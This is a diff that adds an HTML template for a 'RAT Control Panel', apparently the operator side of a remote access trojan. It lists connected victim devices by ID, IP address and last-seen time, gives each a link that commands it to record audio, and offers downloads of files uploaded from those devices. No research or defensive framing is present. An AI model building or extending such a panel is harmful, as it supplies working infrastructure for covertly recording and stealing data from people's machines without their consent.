@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAT Control Panel</title>
+    <style>
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid black; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+    </style>
+</head>
+<body>
+    <h1>RAT Control Panel</h1>
+    <h2>Connected Devices</h2>
+    <table>
+        <tr><th>Device ID</th><th>IP Address</th><th>Last Seen</th><th>Actions</th></tr>
+        {% for device in devices %}
+        <tr>
+            <td>{{ device[0] }}</td>
+            <td>{{ device[1] }}</td>
+            <td>{{ device[2] }}</td>
+            <td>
+                <a href="/command/{{ device[0] }}/record_audio">Record Audio</a>
+            </td>
+        </tr>
+        {% endfor %}
+    </table>
+    <h2>Uploaded Files</h2>
+    <table>
+        <tr><th>Device ID</th><th>Filename</th><th>Download</th></tr>
+        {% for file in files %}
+        <tr>
+            <td>{{ file[0] }}</td>
+            <td>{{ file[1] }}</td>
+            <td><a href="/Uploads/{{ file[1] }}">Download</a></td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
